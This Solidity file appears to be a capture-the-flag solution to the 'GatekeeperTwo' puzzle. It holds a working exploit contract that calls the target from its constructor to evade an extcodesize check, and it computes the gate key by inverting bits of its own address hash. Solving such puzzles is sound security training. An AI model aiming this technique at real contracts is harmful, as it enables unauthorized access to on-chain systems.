// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*

> forge script script/GatekeeperTwoKey.s.sol ${OWN_ADDRESS} -vv

> cast send

*/

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoHack {
    // We call the hack function from the constructor so that we skip the "extcodesize" check in the target contract
    constructor(address gatekeeperTwoAddress) {
        hackGatekeeperTwo(gatekeeperTwoAddress);
    }

    function hackGatekeeperTwo(address gatekeeperTwoAddress) internal {
        // The lock will give us the "shape" that we need to adapt to
        uint64 lock = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));

        // The gate key will be "shaped" with a 1 where there is a 0 in the lock
        uint64 gateKey = 0;

        // We traverse the lock bit by bit
        for (uint8 f = 0; f < 64; f++) {
            // If the bit is 0, it needs to be set to 1
            if ((lock >> f) & 1 == 0) {
                // We set the relevant bit to 1
                gateKey = gateKey + uint64(2 ** f);
            }
        }

        // We call the target contract's function
        GatekeeperTwo(gatekeeperTwoAddress).enter(bytes8(gateKey));
    }
}
